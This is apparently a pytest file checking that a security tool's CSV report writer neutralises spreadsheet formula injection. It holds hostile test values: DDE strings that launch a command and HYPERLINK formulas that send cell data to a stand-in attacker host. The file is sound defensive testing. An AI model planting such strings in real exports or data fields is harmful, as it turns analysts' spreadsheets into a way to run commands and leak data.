"""Exports must not execute when the analyst opens them (§59).

Every string in a report can come from an attacker. A hostname is whatever a
device announces over DHCP, mDNS or NetBIOS; a Snort alert message, a service
banner and an incident title are equally external. Excel, LibreOffice and
Google Sheets evaluate a cell beginning ``=``, ``+``, ``-`` or ``@``, so a
device named ``=cmd|'/c calc'!A1`` runs a command on the workstation of the
analyst who exports the host list — the tool becomes the delivery mechanism.
"""

from __future__ import annotations

import csv
from pathlib import Path

import pytest

from aethra_sec.reports.writers import _stringify, write_rows_csv

PAYLOADS = [
    "=cmd|'/c calc'!A1",
    "@SUM(1+1)*cmd|'/c calc'!A1",
    '+HYPERLINK("http://attacker.example/"&A1,"click")',
    "-2+3+cmd|'/c calc'!A1",
    "=1+1",
    "=HYPERLINK(\"http://attacker.example/?\"&A1)",
]


class TestFormulaLeadsAreNeutralised:
    """The four characters a spreadsheet acts on."""

    @pytest.mark.parametrize("payload", PAYLOADS)
    def test_a_payload_is_prefixed(self, payload: str) -> None:
        rendered = _stringify(payload)
        assert rendered.startswith("'"), f"{payload!r} would be evaluated"
        assert rendered[1:] == payload, "the original text was altered"

    def test_leading_whitespace_variants_are_caught(self) -> None:
        """Excel strips a leading tab before deciding what a cell is."""
        for lead in ("\t", "\r"):
            assert _stringify(f"{lead}=cmd|'/c calc'!A1").startswith("'")

    def test_ordinary_text_is_untouched(self) -> None:
        for value in ("workstation-07", "192.168.1.10", "ET SCAN Nmap", ""):
            assert _stringify(value) == value

    def test_numbers_keep_their_sign(self) -> None:
        """A negative figure is a figure, not an injection."""
        for value in ("-5", "-3.14", "+7", "1,234", "0"):
            assert _stringify(value) == value, f"{value} was quoted"

    def test_none_becomes_empty_rather_than_the_word_none(self) -> None:
        assert _stringify(None) == ""


class TestTheWrittenFileIsSafe:
    """End to end, through the real writer."""

    def test_no_exported_cell_begins_with_a_formula_character(
        self, tmp_path: Path
    ) -> None:
        target = tmp_path / "hosts.csv"
        write_rows_csv(["hostname", "note"], [[p, "observed"] for p in PAYLOADS], target)

        with target.open(encoding="utf-8-sig", newline="") as handle:
            rows = list(csv.reader(handle))

        assert len(rows) == len(PAYLOADS) + 1
        for row in rows[1:]:
            for cell in row:
                assert not cell.startswith(("=", "+", "-", "@")), (
                    f"{cell!r} is still executable"
                )

    def test_the_original_value_survives_for_the_reader(self, tmp_path: Path) -> None:
        """Neutralising must not lose the evidence."""
        target = tmp_path / "hosts.csv"
        write_rows_csv(["hostname"], [["=cmd|'/c calc'!A1"]], target)
        with target.open(encoding="utf-8-sig", newline="") as handle:
            rows = list(csv.reader(handle))
        assert rows[1][0].lstrip("'") == "=cmd|'/c calc'!A1"

    def test_column_headers_are_neutralised_too(self, tmp_path: Path) -> None:
        """Export buttons can be given a column name from a record set."""
        target = tmp_path / "odd.csv"
        write_rows_csv(["=cmd|'/c calc'!A1"], [["value"]], target)
        with target.open(encoding="utf-8-sig", newline="") as handle:
            header = next(csv.reader(handle))
        assert not header[0].startswith("=")
